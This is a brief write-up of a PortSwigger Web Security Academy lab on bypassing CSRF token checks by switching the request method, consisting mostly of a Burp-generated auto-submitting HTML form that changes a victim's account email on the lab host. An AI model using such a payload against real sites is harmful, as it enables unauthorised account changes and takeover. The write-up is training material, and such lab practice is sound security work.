# Lab: CSRF where token validation depends on request method

**Link**: [https://portswigger.net/web-security/csrf/lab-no-defenses](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

**Solution**: seems that the CSRF token is fixed and there is no validation
1- Intercept the request with burp

2- Change the POST request to GET and delete the csrf token paramter

like the folllowing

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9e000003c906e7c1125c66009600d9.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="mohamed&#46;aaaa&#64;yahoo&#46;comaa" />

      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<p align="center" width="100%">
  <img src="https://github.com/aboelkassem/portswigger-labs/blob/main/CSRF/Lab%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/image1.png" width="500" hight="500"/>
</p>
